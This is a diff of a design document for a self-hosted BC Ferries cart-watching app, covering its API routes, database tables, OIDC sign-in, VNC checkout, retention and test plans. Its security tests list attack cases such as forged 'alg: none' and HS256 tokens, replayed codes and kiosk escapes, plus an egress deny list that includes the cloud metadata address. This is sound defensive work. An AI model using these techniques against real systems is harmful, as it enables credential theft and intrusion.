@@ -1251,9 +1418,9 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
 | `POST /api/trips/{id}/cart/release` and `/dismiss` | Scoped. Inserts an `agent_commands` row. |
 | `POST /api/trips/{id}/cart/self-book` | **New.** Release, then return `search_url` for the user to book directly. |
 | `POST /api/trips/{id}/vnc` | **New.** Ticket mint (§3.6 step 4). A bearer-authenticated JSON POST; the existing Origin and JSON checks still apply. |
-| `POST /api/trips/{id}/booked` `{booked: bool, reason?: enum}` | **New.** The "Booked it?" answer. `true` archives; `false` resumes. `reason` is one of `needed_account`, `payment_failed`, `checkout_broke`, `ran_out_of_time`, `changed_mind` (§5.7). |
+| `POST /api/trips/{id}/booked` `{booked: bool, reason?: enum}` | **New.** The "Booked it?" answer. `true` archives; `false` resumes. `reason` is one of `needed_account`, `tried_sign_in`, `payment_failed`, `checkout_broke`, `ran_out_of_time`, `changed_mind` (§5.7). |
 | `PATCH /api/me` | `{paused, interval_seconds, quiet_hours}` per user, replacing the global `PATCH /api/settings` `enabled` that let one viewer pause everyone. |
-| `DELETE /api/me` | **New.** Delete my data: drain pods, delete trips, push subscriptions, alert memory and sessions; redact audit payloads to ids. |
+| `DELETE /api/me` | **New.** Delete my data: drain pods, delete trips, push subscriptions, alert memory, sessions and `identities` rows; strip user and trip ids from `hold_outcomes`; redact audit payloads to ids. |
 | `POST/DELETE /api/me/push-subscriptions` | **New.** Web Push. |
 | `POST /api/alerts/test` | Per-user cooldown (6/h) instead of the global 30 s (`server.py:46`, `:410-423`). |
 | `GET /c/{trip}`, `/admin`, `/settings`, `/auth/callback` | Serve `index.html` (explicit routes, no wildcard). |
@@ -1278,9 +1445,10 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
 | Table | Key columns | Writer(s) |
 |---|---|---|
 | `users` | `id text pk (uid)`, state (active/suspended), username, email, display, is_admin, interval_pref, quiet_hours, paused, created_at, last_seen_at | web |
-| `identities` | (iss, sub) pk, uid, username, last_groups, first/last_seen | web |
+| `identities` | (iss, sub) pk, uid (a cache of the derived uid; must equal it, C23), username, email, last_groups, first/last_seen | web |
+| `unmatched_identities` | (iss, sub) pk, preferred_username, email, first_seen, last_seen | web |
 | `invites` | id, match_claim, match_value, email, limit overrides jsonb, reason, created_by, created_at, expires_at, used_by_uid, used_at | web |
-| `sessions` | `token_hash bytea pk` (SHA-256 of the bearer token), user_id, iss, sub, client_label, created_at, last_used_at, idle_expires_at, expires_at, revoked_at, revoked_reason | web |
+| `sessions` | `token_hash bytea pk` (SHA-256 of the bearer token), user_id, iss, sub, client_label, created_at, last_used_at, verified_at, idle_expires_at, expires_at, revoked_at, revoked_reason | web |
 | `user_limits` | uid, key, value, set_by, reason, set_at | web (clamped on read) |
 | `trips` | `id char(16) pk`, `user_id` (immutable), rev, spec jsonb (validated by `Trip.from_json`), enabled, `paused_reason`, `checkout_mode` (default `'guest'`; v1's CHECK allows only `'guest'`, and widening it is an expand-only migration), created/updated/archived | web; control (column grants on `paused_reason`, `archived_at` only) |
 | `trip_runtime` | trip_id pk, phase, reason, queue_position, reserved_until, gen, failures, backoff_until, updated_at | control |
@@ -1291,18 +1459,21 @@ The `groups` claim never grants admin by itself. **Admins never get VNC** into t
 | `events` | id, user_id, trip_id, ts, kind, code, params jsonb (typed, bounded) | web, control (insert) |
 | `notifications` (outbox) | id, user_id, trip_id, kind, params jsonb, dedup_key unique, created_at, sent_at, attempts, last_error | control inserts; web inserts (RLS-limited) and updates sent |
 | `push_subscriptions` | id, user_id, endpoint, p256dh, auth, created, last_ok, failures | web |
-| `vnc_mints` | jti pk, user_id, trip_id, pod, cart_id, created_at | web |
+| `vnc_mints` | jti pk, user_id, trip_id, pod, aud, cart_id (nullable: only the `fw-vnc` audience has one, §5.5), created_at | web |
+| `hold_outcomes` | id, user_id, trip_id, day (Pacific), outcome, answer_reason, fare (≤ 32), vehicle_type, login_seen (none, visit, forced), release_check, checkout_seconds | control (on `bye`); web (answer reason) |
 | `usage_ledger` | (user_id, day Pacific, kind) pk, amount (holds, cart_attempts, vnc_seconds, manual_checks, test_alerts, mints, pod_starts) | control, web |
 | `fleet_state` | key pk, value jsonb (brake, breaker, maintenance, pause_carting, control_alive_at) | control; web (maintenance and pause toggles only) |
 | `audit_log` | id, ts, actor_kind (user/admin/system), actor, action, target_kind, target_id, before, after, reason, request_id | both (INSERT only) |
 
 - Policy defaults live in Helm values (ConfigMap), not in a DB `policy` table; per-user overrides live in
   `user_limits`.
-- **Retention:** events 30 d, notifications 14 d, `browser_pods` 30 d, audit and usage 400 d; sessions 30 d
-  after they expire or are revoked; invites 30 d after use or expiry. Archived trips are deleted 90 d after
+- **Retention:** events 30 d, notifications 14 d, `browser_pods` 30 d, audit, usage and `hold_outcomes`
+  400 d; sessions 30 d after they expire or are revoked; invites 30 d after use or expiry;
+  `unmatched_identities` 30 d after last seen. Archived trips are deleted 90 d after
   the sailing. `DELETE /api/me` and the admin "delete user" act at once and redact
   audit `before/after` to ids.
-- **No BC Ferries data** is ever stored.
+- **No BC Ferries account data** (credentials, cookies, booking references) is ever stored; only the sailing
+  and cart summaries the agent reports.
 - **Backup and restore:** the cluster's PITR restores the whole shared `postgres17` (Authelia, lldap and
   Immich too), so it is not a per-app restore. The per-app path is the cnpg component's pg_dump CronJob
   (every 4 h to NFS, `components/cnpg/cronjob.yaml`); the restore runbook is in §12.5.
@@ -1683,12 +1854,14 @@ matching `^wss://ferry-checkout\.chestr\.dev/t/[a-f0-9]{16}/g/[0-9]{1,6}/ws$` on
 `["binary", "fw.n1.<N>"]`, plus `fw.t1.<ticket>` while a ticket is pending; it drops the ticket after the
 first successful open. If the client gives up reconnecting before the hold deadline it knows from `disp`, the
 shim reloads `vnc.html` with back-off (1, 2, 5, 10 s), so retries are effectively uncapped until the deadline.
-The landing page sets `#path=t/<trip>/g/<gen>/ws&autoconnect=1&reconnect=1&reconnect_delay=1000&idle_disconnect=120`
-and shows the sailing and deadlines with `textContent`, plus a static note: "Check out as a guest: signing in
-to BC Ferries during checkout can empty this cart" (§5.7). If the fragment's ticket has already expired (a slow
-load) and this device holds no lock yet, it sends the user back to `https://ferry.chestr.dev/c/<trip>` to mint
-again; with no ticket and no stored `N` it shows only a link back to the dashboard. A CI test drives the stock client in headless Chromium
-against a fake gate and asserts the path and subprotocols, so a KasmVNC bump that changes this fails CI.
+The landing page sets
+`#path=t/<trip>/g/<gen>/ws&autoconnect=1&reconnect=1&reconnect_delay=1000&idle_disconnect=120` and shows the
+sailing and deadlines with `textContent`, plus a static note: "Check out as a guest. Don't sign in to BC Ferries
+here: it doesn't accept a sign-in while a cart is held" (§5.7). If the fragment's ticket has already expired (a
+slow load) and this device holds no lock yet, it sends the user back to `https://ferry.chestr.dev/c/<trip>` to
+mint again; with no ticket and no stored `N` it shows only a link back to the dashboard. A CI test drives the
+stock client in headless Chromium against a fake gate and asserts the path and subprotocols, so a KasmVNC bump
+that changes this fails CI.
 
 ```nginx
 map $http_upgrade $connection_upgrade { default upgrade; '' close; }
@@ -1742,21 +1915,23 @@ charts/ferry-watch/
                config-configmap.yaml control-config-configmap.yaml db-init-job.yaml db-migrate-job.yaml
                networkpolicies.yaml ciliumnetworkpolicies.yaml prometheusrule.yaml podmonitors.yaml
     edge/      vnc-edge.yaml vnc-edge-configmap.yaml
-    routes/    dashboard-httproute.yaml vnc-httproute.yaml                                  # routes.enabled
+    routes/    dashboard-httproute.yaml vnc-httproute.yaml     # routes.dashboard.enabled, routes.checkout.enabled
     browsers/  namespace.yaml serviceaccount.yaml headless-service.yaml policy-params-configmap.yaml
                resourcequotas.yaml limitrange.yaml networkpolicies.yaml ciliumnetworkpolicy.yaml
     cluster/   priorityclass.yaml vap-browser-pod.yaml vap-browser-pod-lock.yaml vap-ns-objects.yaml
                vapbindings.yaml clusterroles.yaml
   tests/       helm-unittest suites (rbac-forbidden, vap-params == control-config, quota ≤ budget,
-               trusted headers + envoy-external route fails, values combinations)
+               trusted headers + external dashboard route fails, values combinations)
 ```
 
-Values `routes.enabled` (default false) and `routes.dashboardHost` let M1 run on `ferry-next.chestr.dev`
+Values `routes.dashboard.enabled` and `routes.checkout.enabled` (both default false) and `routes.dashboardHost`
+let M1 run on `ferry-next.chestr.dev`
 without touching the live `ferry.chestr.dev` route on envoy-internal (two routes for one host would collide in
 UniFi DNS; §12.5). `vaps.lock` and `vaps.nsObjects` default to false until M3. `identity.oidc.*` holds the
 issuer, the client id, the scopes, the claim names and the invite-match claim; the client secret comes from
-the ExternalSecret. `identity.trustedHeaders.enabled` defaults to false and cannot be combined with
-`routes.enabled`.
+the ExternalSecret. `identity.trustedHeaders.enabled` defaults to false, needs
+`identity.trustedHeaders.issuer`, and cannot be combined with `routes.dashboard.enabled` (the external
+dashboard route); the checkout route is unaffected.
 
 **home-cluster owns:**
 - `kubernetes/apps/ferry-watch/`: namespace directory with `components/common`; `ks.yaml` with
@@ -1865,7 +2040,7 @@ This is the only place numbers are defined; other sections refer here. "Compiled
 | hard hold cap, from READY (replaces `BCF_CART_HOLD_MINUTES=60`/0, `settings.py:30`) | 60 min | compiled 90 | agent; operator at +5 min; Xvnc `-MaxConnectionTime 6000` |
 | cart liveness check while unclaimed (reads the cart page; never presses the site's "continue") | every 4 min; values flag to turn it off | — | agent |
 | "Did you book it?" auto-resume / slot reservation | 20 min / 30 min | — | control / fleet loop |
-| `guest_checkout_failing` admin alert | 2 or more viewed holds within 7 days ending with a login wall, or a "wanted me to sign in" / "checkout broke" answer | — | control, PrometheusRule |
+| `guest_checkout_failing` admin alert | the first forced login wall or `needed_account` answer; the PrometheusRule `GuestCheckoutFailing` at 2 or more viewed holds within 7 days ending with a forced login wall or a `needed_account` / `checkout_broke` answer. Voluntary visits and `tried_sign_in` never count. | — | control, PrometheusRule |
 | **Cluster** (§8.4) | | | |
 | `browserMemoryBudget` | 12 GiB (owner range 8-24 GiB) | — | chart (quota) |
 | `podMemory` (request = limit) | 1.5 GiB → `ceil(p95 working set incl. tmpfs × 1.2)` after S-MEM | LimitRange 2 GiB | VAP, quota |
@@ -1899,10 +2074,12 @@ This is the only place numbers are defined; other sections refer here. "Compiled
 | **Web** | | | |
 | dashboard WebSocket lifetime / first-message auth deadline | 60 min / 5 s | — | web |
 | app session (bearer token) | 7 d idle / 30 d absolute; revoked on logout, "sign out everywhere", suspension | — | web |
+| IdP re-verification of a session (silent redirect; re-checks the client policy and groups; rotates the token) | every 24 h | 1-24 h (`identity.reverifyHours`) | web, Authelia |
+| pre-auth limits on `/auth/*` and unauthenticated sockets | per client (`CF-Connecting-IP`), plus a global ceiling | — | web |
 | re-sign-in when the app session lapses | silent redirect while the Authelia session lives: 3 d idle / 7 d, or 6 months with remember-me (cluster-wide) | — | Authelia |
 | OIDC consent remembered | 1 year (`pre_configured_consent_duration`) | — | Authelia |
 | invitation validity | 30 d | — | web |
-| **Retention** | events 30 d; outbox 14 d; pod history 30 d; audit and usage 400 d; sessions and invites 30 d after expiry, revocation or use; archived trips deleted 90 d after the sailing; delete-my-data immediate | | db jobs (control) |
+| **Retention** | events 30 d; outbox 14 d; pod history 30 d; audit, usage and hold outcomes 400 d; sessions and invites 30 d after expiry, revocation or use; unmatched identities 30 d after last seen; archived trips deleted 90 d after the sailing; delete-my-data immediate | | db jobs (control) |
 
 ### 8.3 Disruptions, upgrades and restarts
 
@@ -1948,7 +2125,8 @@ only after its predecessor is gone).
   charges tmpfs pages to the container's memory cgroup. The research measured 0.52-0.57 GB of process memory
   per pod on light pages [R:map-k8s-research §g]; real BC Ferries pages, the in-memory profile and cache
   (capped at 32 MiB) and `/dev/shm` add to that. S-MEM measures the cgroup working set
-  (`container_memory_working_set_bytes`, `memory.peak`) while watching and during a checkout with a viewer.
+  (`container_memory_working_set_bytes`, `memory.peak`) while watching (W0) and during the owner's real
+  checkouts with a viewer (M1).
   The start value of 1.5 GiB is deliberately conservative; it drops to the measured value after S-MEM.
 - If the owner's "8-24 GB" meant decimal gigabytes, use 7.45-22.35 GiB in the formula (one or two fewer
   browsers per row). decisions.md's "roughly 7-23 users" is the 1.0 GiB column.
@@ -2031,12 +2209,13 @@ All admin routes require `is_admin` (or `bootstrapAdmins`). Every mutation requi
 
 | Page | Shows | Actions |
 |---|---|---|
-| Fleet (admin home) | capacity (memory used/budget, browsers by phase, queued), budget (navigations/min, brake, breaker), holds now (user, route, countdown), hold outcomes this week (booked, released, expired, login wall seen, "Did you book it?" reasons, releases by check level), attention list (NeedsAttention, image skew, delivery failures, `release_unverified`, `checkout_blocked`, `guest_checkout_failing`) | maintenance on/off, **pause carting** (for Talos upgrades, and the immediate alert-only switch if guest checkout fails, §5.7), close the breaker, release a cart, recycle a pod |
-| Users | state, open invitations, effective limits with provenance, usage today, last seen, push/email status, active sessions | add person (creates an invitation and sends `invited`), suspend (revokes sessions, drains pods; holds released or allowed to finish, by choice), revoke sessions, set overrides, make admin (bootstrap admins are locked), delete user |
+| Fleet (admin home) | capacity (memory used/budget, browsers by phase, queued), budget (navigations/min, brake, breaker), holds now (user, route, countdown), hold outcomes this week and over time from `hold_outcomes` (booked, released, expired, login wall seen and whether forced, "Did you book it?" reasons, releases by check level; by fare and vehicle type), attention list (NeedsAttention, image skew, delivery failures, `release_unverified`, `checkout_blocked`, `guest_checkout_failing`) | maintenance on/off, **pause carting** (for Talos upgrades, and the immediate alert-only switch if guest checkout fails, §5.7), close the breaker, release a cart, recycle a pod |
+| Users | state, open invitations, effective limits with provenance, usage today, last seen, push/email status, active sessions, unmatched sign-ins (last 30 days), sign-ins whose email changed | add person (creates an invitation and sends `invited`), suspend (revokes sessions, drains pods; holds released or allowed to finish, by choice), revoke sessions, set overrides, make admin (bootstrap admins are locked), delete user |
 
 **API:** `GET /api/admin/overview`; `GET/POST/PATCH/DELETE /api/admin/users[/{id}]`;
-`GET/POST/DELETE /api/admin/invites[/{id}]`; `POST /api/admin/users/{id}/revoke-sessions`;
-`POST /api/admin/trips/{id}/{release|recycle}`; `POST /api/admin/fleet/{maintenance|pause-carting|breaker}`.
+`GET/POST/DELETE /api/admin/invites[/{id}]`; `GET /api/admin/unmatched`;
+`POST /api/admin/users/{id}/revoke-sessions`; `POST /api/admin/trips/{id}/{release|recycle}`;
+`POST /api/admin/fleet/{maintenance|pause-carting|breaker}`.
 
 The draft's Trips, Settings and Audit pages, the DB `policy` table and the request-access queue are deferred
 to M4 (§12.2). Until then audit is read with `psql` or from VictoriaLogs, and defaults change through a values
@@ -2050,11 +2229,13 @@ PR.
   - `ferrywatch_browsers{phase}`, `ferrywatch_queue_depth`, `ferrywatch_memory_{requested,budget}_bytes`;
   - `ferrywatch_bcf_navigations_total{kind}`, `ferrywatch_queueit_detours_total`, `ferrywatch_brake_multiplier`,
     `ferrywatch_breaker_state`;
-  - `ferrywatch_holds{state}`, `ferrywatch_holds_total{outcome}` (the `bye` outcomes plus the "Did you book
-    it?" answer and reason), `ferrywatch_checkout_host_blocked_total`, `ferrywatch_checkout_login_seen_total`,
-    `ferrywatch_releases_total{check}` (cart_empty, landing_url, none);
+  - `ferrywatch_holds{state}`, `ferrywatch_holds_total{outcome}` (the `bye` outcomes plus the "Did you book it?"
+    answer and reason), `ferrywatch_checkout_host_blocked_total`,
+    `ferrywatch_checkout_login_seen_total{forced}`, `ferrywatch_releases_total{check}` (cart_empty, landing_url,
+    none);
   - `ferrywatch_alerts_total{channel,result}`, `ferrywatch_reaper_actions_total{reason}`,
-    `ferrywatch_vap_denials_total`, `ferrywatch_signins_total{result}` (ok, denied, not_invited, error);
+    `ferrywatch_vap_denials_total`, `ferrywatch_signins_total{result}` (ok, reverified, denied, not_invited,
+    uid_mismatch, error);
   - histograms for check seconds, pod-ready seconds, agent working set, `ferrywatch_opening_visible_seconds`,
     `ferrywatch_checkout_seconds` (first viewer to hold end; tunes the session clock in place of S2b) and
     `ferrywatch_site_cart_ttl_seconds` (READY to `cart_expired_by_site`; tunes the unclaimed clock in place
@@ -2089,12 +2270,15 @@ The size is L: about 2-2.5k changed or added lines, including tests [R:map-front
 3. **Routes:** path routes `/` (my trips), `/c/:trip` (checkout chooser), `/settings` and `/admin`, with a
    small router. The server serves `index.html` on those exact paths.
 4. **Sign-in (OIDC, §6.2.2):** a small signed-out screen with one "Sign in" button (Authelia's page does the
-   rest); the `/auth/callback` route (check `state`, clear the fragment, POST `/auth/session`, store the token
-   in localStorage, return to the saved path); `Authorization: Bearer` on every fetch (`api.ts`); the
-   dashboard WebSocket's first `auth` message; a 401 starts sign-in again, keeping the current path, so a
-   cart alert still lands on `/c/<trip>`; a 403 for a non-active user shows "Your access is being set up" or
-   "Your account is suspended". The token never goes in a URL or the service worker. The manifest needs no
-   `crossorigin` change, because nothing sits behind gateway auth any more.
+   rest), shown when there is no token and after an explicit sign-out (a "signed out" flag in localStorage stops
+   any automatic sign-in until the button is pressed); the `/auth/callback` route (check `state`, clear the
+   fragment, POST `/auth/session`, store the token in localStorage, return to the saved path);
+   `Authorization: Bearer` on every fetch (`api.ts`); the dashboard WebSocket's first `auth` message; a 401
+   with reason `expired` or `reverify` starts sign-in again automatically, keeping the current path, so a cart
+   alert still lands on `/c/<trip>`, while `revoked` shows the signed-out screen; a 403 for a non-active user
+   shows "Your access is being set up" or "Your account is suspended". The token never goes in a URL or the
+   service worker. The manifest needs no `crossorigin` change, because nothing sits behind gateway auth any
+   more.
 5. **Components:**
    - Replace `WatcherCard` (`WatcherCard.tsx:159-238`) with an **Account card**: push subscribe and status,
      a test alert, "pause all my trips", interval preference (choices from 30 s), quiet hours, "Signed in
@@ -2106,17 +2290,18 @@ The size is L: about 2-2.5k changed or added lines, including tests [R:map-front
      create time.
    - `/c/:trip`: the held sailing, the deadlines, and **Check out on this device** / **I'll use my computer**
      / **Release and book it myself**, with "Checkout will be locked to the device you choose" and "Check
-     out as a guest: signing in to BC Ferries during checkout can empty this cart" (§5.7). No automatic
-     POST.
+     out as a guest. Don't sign in to BC Ferries here: it doesn't accept a sign-in while a cart is held"
+     (§5.7). No automatic POST.
    - `CartBanner` (`CartBanner.tsx:44`, `:112-113`, `:136-140`): per-trip "Open checkout" (goes to `/c`),
-     the unclaimed and session countdowns, "paused while paying", the guest wording (including the sign-in
-     warning), and "Release".
+     the unclaimed and session countdowns, "paused while paying", the guest wording (including the
+     don't-sign-in advice), and "Release".
    - "Did you book it?" (a "No" offers the optional one-tap reasons of §5.7) and "Booked!" screens; the
      latter carries the Ko-fi link.
    - `TripSheet` (`TripSheet.tsx:317`, `:470-500`): auto-cart is always available (guest). Remove the
      `BCF_USER` copy. Show 409 limit errors, including "Pause *X* to watch this one".
    - `Header` (`Header.tsx:59-86`): the global "Watch all trips" switch becomes a user menu (pause mine,
-     settings, sign out, admin; sign-out ends the app session and offers a link to Authelia's logout page).
+     settings, sign out, admin; sign-out ends the app session, sets the "signed out" flag and offers a link
+     to Authelia's logout page).
    - The "watcher stalled" banner (`App.tsx:34-36`, `Banners.tsx:119-125`) becomes per trip, with a separate
      admin-only control-plane health banner.
    - A Powell River–Comox note pointing to BC Ferries' waitlist.
@@ -2129,7 +2314,8 @@ The size is L: about 2-2.5k changed or added lines, including tests [R:map-front
    as JSON.
 9. **Tests:** update the fixtures every suite uses; rewrite the `WatcherCard` and `watcher.ts` tests; add tests
    for the router, the `/c` chooser, the Account card, the sign-in start and callback (`state` mismatch,
-   missing verifier, return path), bearer headers, the WebSocket `auth` message and 401 handling.
+   missing verifier, return path), bearer headers, the WebSocket `auth` message, 401 handling by reason, and
+   no automatic sign-in after an explicit sign-out.
 10. **Admin pages** (M2): Fleet and Users (§9.4), with their own zod schemas and tests.
 
 ---
@@ -2170,7 +2356,8 @@ as `X.Y.Z@sha256` with provenance. SBOMs and cosign signatures come with admissi
 - **CI-only:** `ferry-watch-agent-e2e` carries the marker file that alone enables `FW_E2E_BASE_URL` and the
   127.0.0.1 allow policy; `fake-bcferries` is extracted from `tests/browser/test_site_flow.py` into a runnable
   server (with confirmation, expired-cart, login-wall and 3DS-iframe pages, synthetic until the pages
-  captured during M1 replace them).
+  captured during M1 replace them). It keeps serving `/login` and `/my-account` from the existing flow
+  fixtures (`tests/fixtures/flow/login.html`, `my-account.html`), so the kept login path stays tested.
 
 ### 11.3 CI jobs
 
@@ -2210,16 +2397,25 @@ matter. They are proven on the home cluster (§11.4 tier 6).
    - the one-trip watcher with `tests/fakes.py`: HoldPolicy clocks and the payment guard, compiled maxima,
      `alerted` versus `offered`, the lost-after-viewer rule, exit after a viewed hold, `_close_all` emptying,
      the `empty_cart` release check (landing URL now; empty cart once fixtures exist), booking detection,
-     `checkout_login_seen`, the control-ack gate on carting, the login path staying unreachable while its flag
-     is off;
+     `checkout_login_seen` with `forced` set for a redirect into the login page and unset for a user-started
+     visit, the hold-outcome record, the control-ack gate on carting, the login path staying unreachable
+     while its flag is off;
+   - **door 1 kept alive:** today's watcher login and back-off tests (`tests/test_watcher.py:56-107`,
+     `:292-301`, `:473-485`) ported to the one-trip agent with `login_enabled` forced on in the test, and the
+     `SiteSession.login()` tests (`tests/browser/test_site_flow.py:264-274`) kept running against
+     fake-bcferries, so the disabled path cannot rot unnoticed;
    - protocol codec plus hypothesis fuzzing (unknown types and fields, oversize, wrong trip, stale rev, an
      unknown `checkout_mode`);
-   - identity, against a fake issuer: `id_token` signature, wrong `iss`, `aud` or `azp`, expired, wrong
-     `nonce`, unknown `kid` (one JWKS refetch), a replayed code; uid derivation; invitation binding by
-     `preferred_username`, expiry and single use; the bootstrap admin binding; session hashing, idle and
-     absolute expiry, revocation on logout, "sign out everywhere" and suspension (sockets closed); the
-     WebSocket first-message deadline; no `Set-Cookie` on any response; `TrustedHeaderProvider` refused with
-     the external route;
+   - identity, against a fake issuer: `id_token` signature, `alg: none` and an HS256 token keyed with the
+     client secret (both refused), wrong `iss`, `aud` or `azp`, expired, wrong `nonce`, unknown `kid` (one
+     JWKS refetch), a replayed code; uid derivation, alias precedence over `identities` rows and
+     `bootstrapAdmins`, and an `identities` row whose uid disagrees (sign-in refused, admin alerted); an
+     unmatched principal recorded; invitation binding by `preferred_username`, expiry and single use; the
+     bootstrap admin binding; session hashing, idle and absolute expiry, re-verification due after 24 h and
+     token rotation on it, revocation on logout, "sign out everywhere" and suspension; a socket closed when
+     its own session is revoked or expires (and not when another session of the same user is); the
+     WebSocket first-message deadline and 4 KiB message cap; per-client pre-auth limits; no `Set-Cookie` on
+     any response; `TrustedHeaderProvider` refused with the external dashboard route;
    - repository scoping: a foreign trip gives 404 on every route; per-user Hub payloads;
    - the gate against a fake Xvnc unix socket: owner, cart, Origin, jti replay, lock, two simultaneous first
      viewers (exactly one wins), reconnect with `N` replacing a stale socket, ticket refused after the lock,
@@ -2255,7 +2451,8 @@ matter. They are proven on the home cluster (§11.4 tier 6).
    Chromium), the control endpoint by its FQDN; *denials* for the kube-apiserver, kubelet 10250, a node IP,
    169.254.169.254, another browser pod, ferry-web :8765, smtp-relay and `example.com`; and the lockdown
    self-tests. Hubble shows the denials. An echo check confirms no ferry backend receives a Cookie header
-   (including requests with several Cookie headers and over HTTP/2) and vnc-edge receives no Authorization;
+   (including requests with several Cookie headers and over HTTP/2), ferry-web receives no `Remote-*` header,
+and vnc-edge receives no Authorization;
    an unauthenticated `GET /api/state` returns 401. The `can-i` matrix runs against the live cluster.
 
 ### 11.5 Security invariants that block CI
@@ -2290,12 +2487,16 @@ The egress matrix is a post-deploy gate, not a pre-merge one: it can only be pro
 
 ### 12.1 Spikes
 
-**No live-site spikes** (owner, round 2: "No spike for now, assume it works and if not we will adjust later,
-don't make any one way door decisions on this"). S1, S2, S2b, S5, S6, S7 and the live part of S-FIX are gone
-from W0 and from the critical path. What they would have produced now comes from the owner's real use during
-M1 (fixtures) and from production detection and telemetry, behind reversible defaults (§5.7). The spikes that
-remain are cluster or local experiments that decide design branches; none holds BC Ferries inventory. Spike
-days are counted in the calendar (§12.3), not run "in parallel" with code.
+**No spike tests guest checkout, and no booking is made only to test** (owner, round 2: "No spike for now,
+assume it works and if not we will adjust later, don't make any one way door decisions on this"). S1, S2,
+S2b, S5, S6, S7 and the live part of S-FIX are gone from W0 and from the critical path. What they would have
+produced now comes from the owner's real use during M1 (fixtures) and from production detection and
+telemetry, behind reversible defaults (§5.7). The spikes that remain are cluster or local experiments that
+decide design branches. Most never touch BC Ferries; S-MEM reads real BC Ferries pages the way watching
+does; S-DRAIN and the M1 VNC exit check briefly hold one real cart on a far-out sailing with space and release
+it, as the product itself does; S-3DS uses the household's real checkouts and walks a card to the 3DS step
+only if the owner agrees under Q8. Spike days are counted in the calendar (§12.3), not run "in parallel"
+with code.
 
 | Spike | When | Exact experiment | Pass | If it fails |
 |---|---|---|---|---|
@@ -2303,16 +2504,16 @@ days are counted in the calendar (§12.3), not run "in parallel" with code.
 | **S-KIOSK** (local, Playwright 1.56 under matchbox) | W0 | Policies in 3 dirs plus `--kiosk` plus a persistent context. Try escapes (Ctrl+T/N/O/U/Shift+I, closing the last window). Run the self-tests (§5.6) including the LNA policy names. Xvnc with `-rfbunixpath` and no WebSocket listener; a prototype gate bridging WS ↔ unix socket; the stock KasmVNC client through the shim. Does `URLBlocklist ["*"]` block a cross-origin subframe? Check `handle_sig*=False` plus the supervisor drain ordering. Type into a 6-field form with phone keyboards' burst patterns (no `DLP_KeyRateLimit`). | The CDP pipe works under the policies. Every escape is blocked. No TCP listeners but the gate's and the probe server's. The stock client connects through the shim. TERM reaches only the agent and the cart is emptied before Chromium stops. Typed values are byte-exact. | No pod-served VNC until it passes; fall back to Xvnc WebSocket on 127.0.0.1:6081 behind a per-boot BasicAuth credential, with self-tests 2-3 blocking. |
 | **S-VNC-lite** (cluster) | W0 | A throwaway pod running the S-KIOSK gate prototype and showing a static test page (never today's unauthenticated container, never a BC Ferries session) behind a static HTTPRoute on envoy-external under a random path, through the Cloudflare tunnel. From iPhone Safari, the iOS home-screen app (opened from a notification) and Android Chrome: background the browser for 90 s (bank-app approval), switch Wi-Fi to LTE, leave a static page for 3 min; with 20 s pings. Where does `N` live on the iOS home-screen path, and does a return via the dashboard find it? Exact CSP (QOI on/off). Rocket Loader off. Gate CPU at 15 fps. | Reconnects within 10 s in every case; `N` survives the return on all three clients; gate ≤ 0.3 CPU. | If iOS loses `N`, Q1b; if Cloudflare cuts sockets despite pings, shorten the ping. |
 | **S-CIL** (cluster) | W0 | Apply `nameError` (home-cluster). Check `cilium config view` for the DNS proxy. Apply the browser CNP to a test pod. Then: `toFQDNs` reach bcferries.com with the Python resolver and in Chromium; the control endpoint resolves by its FQDN (with and without the trailing dot); DNS for other names fails; the deny matrix holds (apiserver, LAN, nodes, pods, smtp-relay, observability). With Hubble, check whether vnc-edge→pod and pod→control traffic is SNATed cross-node. Check the bandwidth annotation with netkit. | All of these work. | `toCIDRSet` fallback plus `kube-apiserver`-entity ingress where SNATed; a per-pod egress proxy moves from M4 to M3. |
-| **S-OIDC** (cluster; replaces S-AUTH) | W0 | Register the Authelia client (redirect on `ferry-next.chestr.dev`) and the chart's dashboard route, pointed at a test build of ferry-web's sign-in (or an echo backend plus a script). Check: Authorization Code + PKCE with `response_mode=fragment` accepted by Authelia 4.39 at runtime; a user outside `ferry-watch`/`admin` is denied; a remembered consent makes the second sign-in silent; `prompt=none` answers as documented; ferry-web reaches the token endpoint and JWKS through the CNP rule to the envoy-external pods on 10443; the echo shows no Cookie (also with several Cookie headers and over HTTP/2) and `Authorization` intact; the WebSocket upgrade passes. | All as stated. | Fragment refused: `query` mode with the stated C15 exception (§2.3). Egress rule fails: `toCIDRSet` for the LB address, or `toFQDNs` if in-cluster DNS returns public addresses. |
+| **S-OIDC** (cluster; replaces S-AUTH) | W0 | Register the Authelia client (redirect on `ferry-next.chestr.dev`) and the chart's dashboard route, pointed at a test build of ferry-web's sign-in (or an echo backend plus a script). Check: Authorization Code + PKCE with `response_mode=fragment` accepted by Authelia 4.39 at runtime; a user outside `ferry-watch`/`admin` is denied, and removing a signed-in test user from the group makes their next re-verification fail (`access_denied`); a remembered consent makes the second sign-in silent; `prompt=none` answers as documented; ferry-web reaches the token endpoint and JWKS through the CNP rule to the envoy-external pods on 10443; the echo shows no Cookie (also with several Cookie headers and over HTTP/2) and `Authorization` intact; the WebSocket upgrade passes. | All as stated. | Fragment refused: `query` mode with the stated C15 exception (§2.3). Egress rule fails: `toCIDRSet` for the LB address, or `toFQDNs` if in-cluster DNS returns public addresses. |
 | **S-TR** (cluster) | W0 | TokenReview with audience returns `extra` pod-uid and pod-name. VAP with ConfigMap params. VAP CONNECT denies exec (needed in M3). | All work on 1.36.5. | RBAC-only for CONNECT; note it. |
-| **S-MEM** (cluster) | W0 | Cgroup working set (`memory.peak`, `container_memory_working_set_bytes`, including tmpfs) on real pages while Watching and during checkout with a viewer; CPU; pod create → first check p50/p95 with a cold and a warm image. | Numbers recorded. | Sets `podMemory`, `cpuRequest` and `maxBrowsersTotal` (§8.4). |
+| **S-MEM** (cluster) | W0, checkout part in M1 | W0: cgroup working set (`memory.peak`, `container_memory_working_set_bytes`, including tmpfs) on real pages while Watching (no cart); CPU; pod create → first check p50/p95 with a cold and a warm image. M1: the same during the owner's real holds with a viewer (no hold made for the measurement). | Numbers recorded. | Sets `podMemory`, `cpuRequest` and `maxBrowsersTotal` (§8.4); `podMemory` stays at 1.5 GiB until the checkout numbers exist. |
 | **S-DB** | W0 | The cnpg component with `APP=ferrywatch`; the stock `postgres-init` creates the DB; CNPG managed roles appear; `db-migrate` grants, RLS and trigger work; LISTEN/NOTIFY through `postgres17-rw`. | Works. | One login role for both processes, as a stated residual. |
